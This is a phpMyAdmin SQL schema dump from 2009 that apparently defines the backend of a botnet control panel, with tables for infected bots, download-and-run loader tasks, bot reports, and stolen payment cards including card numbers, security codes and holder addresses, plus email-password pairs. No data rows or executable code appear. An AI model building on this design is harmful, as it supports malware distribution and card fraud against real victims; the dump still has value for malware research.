-- phpMyAdmin SQL Dump
-- version 2.9.1.1-Debian-10
-- http://www.phpmyadmin.net
-- 
-- Host: localhost
-- Generation Time: Sep 28, 2009 at 11:31 PM
-- Server version: 5.0.32
-- PHP Version: 5.2.0-8+etch13
-- 
-- Database: `btcc1`
-- 

-- --------------------------------------------------------

-- 
-- Table structure for table `bots_rep_t`
-- 

CREATE TABLE `bots_rep_t` (
  `id_rep` bigint(20) NOT NULL auto_increment,
  `fk_bot_rep` bigint(20) default NULL,
  `data_rep` varchar(1000) default NULL,
  `date_rep` datetime default '1970-01-01 00:00:00',
  `fk_global_task` bigint(20) unsigned default NULL,
  PRIMARY KEY  (`id_rep`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 AUTO_INCREMENT=3876 ;

-- --------------------------------------------------------

-- 
-- Table structure for table `bots_t`
-- 

CREATE TABLE `bots_t` (
  `id_bot` bigint(20) unsigned NOT NULL auto_increment,
  `guid_bot` char(50) character set utf8 collate utf8_unicode_ci NOT NULL default '',
  `ver_bot` char(25) character set utf8 collate utf8_unicode_ci NOT NULL default '',
  `status_bot` char(50) character set utf8 collate utf8_unicode_ci NOT NULL default '',
  `blocked` tinyint(4) NOT NULL default '0',
  `fk_city_bot` bigint(20) unsigned NOT NULL default '0',
  `date_last_run_bot` datetime default '1970-01-01 00:00:00',
  `date_last_online_bot` datetime default '1970-01-01 00:00:00',
  `os_version_bot` varchar(25) default NULL,
  `ie_version_bot` varchar(25) default NULL,
  `user_type_bot` varchar(25) default NULL,
  `date_install_bot` timestamp NOT NULL default CURRENT_TIMESTAMP,
  `date_last_geoip_check_bot` datetime default '1970-01-01 00:00:00',
  PRIMARY KEY  (`id_bot`),
  UNIQUE KEY `guid_bot` (`guid_bot`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 COMMENT='table of bots' AUTO_INCREMENT=16826 ;

-- --------------------------------------------------------

-- 
-- Table structure for table `cards`
-- 

CREATE TABLE `cards` (
  `id_card` bigint(20) unsigned NOT NULL auto_increment,
  `NUM` varchar(40) default NULL,
  `CSC` varchar(5) default NULL,
  `EXP_DATE` timestamp NULL default NULL,
  `NAME` varchar(100) NOT NULL,
  `SURNAME` varchar(100) NOT NULL,
  `ADDRESS` varchar(100) default NULL,
  `CITY` varchar(50) default NULL,
  `STATE` varchar(30) default NULL,
  `POST_CODE` varchar(10) default NULL,
  `PHONE_NUM` varchar(30) default NULL,
  `USED` tinyint(4) NOT NULL default '0',
  `FK_EMAIL` bigint(20) NOT NULL,
  `FK_COUNTRY` bigint(20) NOT NULL,
  `fk_gtask` bigint(20) unsigned NOT NULL,
  PRIMARY KEY  (`id_card`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 AUTO_INCREMENT=3524 ;

-- --------------------------------------------------------

-- 
-- Table structure for table `city_t`
-- 

CREATE TABLE `city_t` (
  `id_city` bigint(20) unsigned NOT NULL auto_increment,
  `name_city` varchar(50) character set utf8 collate utf8_unicode_ci NOT NULL default '',
  `state` varchar(50) default NULL,
  `fk_country_city` bigint(20) unsigned NOT NULL default '0',
  PRIMARY KEY  (`id_city`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 AUTO_INCREMENT=4663 ;

-- --------------------------------------------------------

-- 
-- Table structure for table `country_t`
-- 

CREATE TABLE `country_t` (
  `id_country` bigint(20) unsigned NOT NULL auto_increment,
  `name_country` char(50) character set utf8 collate utf8_unicode_ci NOT NULL default '',
  PRIMARY KEY  (`id_country`),
  UNIQUE KEY `name_country` (`name_country`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 COMMENT='table of countres' AUTO_INCREMENT=275 ;

-- --------------------------------------------------------

-- 
-- Table structure for table `dtimes_run_manual`
-- 

CREATE TABLE `dtimes_run_manual` (
  `id` bigint(20) unsigned NOT NULL auto_increment,
  `fk_dtimes` bigint(20) unsigned NOT NULL,
  `new_dtime_manual` datetime NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=915 ;

-- --------------------------------------------------------

-- 
-- Table structure for table `dtimes_run_t`
-- 

CREATE TABLE `dtimes_run_t` (
  `id_dtime_run` bigint(20) NOT NULL auto_increment,
  `dtime_run` datetime NOT NULL default '1970-01-01 00:00:00',
  `fk_global_task_dtimes_run` bigint(20) NOT NULL default '0',
  `fk_task_dtimes_run` bigint(20) default '0',
  PRIMARY KEY  (`id_dtime_run`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 COMMENT='date and times of global task' AUTO_INCREMENT=3494 ;

-- --------------------------------------------------------

-- 
-- Table structure for table `email_t`
-- 

CREATE TABLE `email_t` (
  `id_email` bigint(20) unsigned NOT NULL auto_increment,
  `value_email` varchar(100) NOT NULL,
  PRIMARY KEY  (`id_email`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 AUTO_INCREMENT=2613 ;

-- --------------------------------------------------------

-- 
-- Table structure for table `global_tasks_t`
-- 

CREATE TABLE `global_tasks_t` (
  `id_global_task` bigint(20) NOT NULL auto_increment,
  `start_dtime_global_task` datetime NOT NULL default '1970-01-01 00:00:00',
  `finish_dtime_global_task` datetime NOT NULL default '1970-01-01 00:00:00',
  `check_cities` tinyint(1) default '0',
  `check_states` tinyint(1) default '0',
  `count_bots_global_task` int(10) unsigned default '0',
  `fk_url` bigint(20) unsigned default '0',
  `fk_ref_url` bigint(20) unsigned default '0',
  `note` varchar(500) NOT NULL,
  `paused` tinyint(1) NOT NULL,
  PRIMARY KEY  (`id_global_task`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 COMMENT='table of global tasks' AUTO_INCREMENT=299 ;

-- --------------------------------------------------------

-- 
-- Table structure for table `gtask_knock_t`
-- 

CREATE TABLE `gtask_knock_t` (
  `id` bigint(20) unsigned NOT NULL auto_increment,
  `knocklink` varchar(1000) NOT NULL,
  `cnt` int(10) unsigned NOT NULL,
  `note` varchar(1000) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

-- 
-- Table structure for table `gtask_loader_t`
-- 

CREATE TABLE `gtask_loader_t` (
  `id` bigint(20) unsigned NOT NULL auto_increment,
  `loadlink` varchar(1000) character set cp1251 NOT NULL,
  `loadscnt` int(10) unsigned NOT NULL,
  `ipmasks` varchar(1000) character set cp1251 NOT NULL,
  `note` varchar(200) character set cp1251 default NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=11 ;

-- --------------------------------------------------------

-- 
-- Table structure for table `ip_ban_t`
-- 

CREATE TABLE `ip_ban_t` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `ip_ban` varchar(20) NOT NULL,
  `note` varchar(100) default NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=44 ;

-- --------------------------------------------------------

-- 
-- Table structure for table `ip_t`
-- 

CREATE TABLE `ip_t` (
  `id` bigint(20) NOT NULL auto_increment,
  `fk_bot` bigint(20) NOT NULL,
  `ip` varchar(20) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=14453 ;

-- --------------------------------------------------------

-- 
-- Table structure for table `logs_t`
-- 

CREATE TABLE `logs_t` (
  `id_log` bigint(20) unsigned NOT NULL auto_increment,
  `fk_task_log` bigint(20) unsigned NOT NULL default '0',
  `message_log` text character set utf8 collate utf8_unicode_ci,
  `comment_log` text character set utf8 collate utf8_unicode_ci,
  PRIMARY KEY  (`id_log`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 AUTO_INCREMENT=3624 ;

-- --------------------------------------------------------

-- 
-- Table structure for table `plg_kvip_t`
-- 

CREATE TABLE `plg_kvip_t` (
  `email` varchar(50) NOT NULL,
  `passw` varchar(30) NOT NULL,
  PRIMARY KEY  (`email`),
  UNIQUE KEY `email` (`email`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- --------------------------------------------------------

-- 
-- Table structure for table `tasks_knock_t`
-- 

CREATE TABLE `tasks_knock_t` (
  `id` bigint(20) unsigned NOT NULL auto_increment,
  `fk_gtask` bigint(20) unsigned NOT NULL,
  `botid` bigint(20) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  `rep` varchar(1000) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

-- 
-- Table structure for table `tasks_loader_t`
-- 

CREATE TABLE `tasks_loader_t` (
  `id` bigint(20) unsigned NOT NULL auto_increment,
  `fk_gtask` bigint(20) unsigned NOT NULL,
  `fk_bot` bigint(20) unsigned default NULL,
  `status` tinyint(4) NOT NULL default '0',
  `rep` varchar(1000) character set cp1251 default NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=120 ;

-- --------------------------------------------------------

-- 
-- Table structure for table `tasks_t`
-- 

CREATE TABLE `tasks_t` (
  `id_task` bigint(20) unsigned NOT NULL auto_increment,
  `fk_bot_task` bigint(20) unsigned NOT NULL default '0',
  `begin_time_task` datetime NOT NULL default '1970-01-01 00:00:00',
  `status_task` tinyint(4) NOT NULL default '0',
  `end_time_task` datetime default '1970-01-01 00:00:00',
  `fk_card_task` bigint(20) default NULL,
  `fk_email_task` bigint(20) default NULL,
  PRIMARY KEY  (`id_task`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 AUTO_INCREMENT=4076 ;

-- --------------------------------------------------------

-- 
-- Table structure for table `urls_t`
-- 

CREATE TABLE `urls_t` (
  `id_url` bigint(20) unsigned NOT NULL auto_increment,
  `text_url_urls` text character set utf8 collate utf8_unicode_ci,
  PRIMARY KEY  (`id_url`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 COMMENT='table for urls' AUTO_INCREMENT=65 ;

-- --------------------------------------------------------

-- 
-- Table structure for table `usa_phones`
-- 

CREATE TABLE `usa_phones` (
  `ID` bigint(20) unsigned NOT NULL auto_increment,
  `STATE` varchar(3) NOT NULL,
  `CITY` varchar(50) NOT NULL,
  `PHONE` varchar(20) NOT NULL,
  PRIMARY KEY  (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=11785 ;

-- --------------------------------------------------------

-- 
-- Table structure for table `usa_zip`
-- 

CREATE TABLE `usa_zip` (
  `ID` bigint(20) unsigned NOT NULL auto_increment,
  `ZIP` varchar(15) NOT NULL,
  `CITY` varchar(30) NOT NULL,
  `STATE` varchar(10) NOT NULL,
  PRIMARY KEY  (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=41756 ;
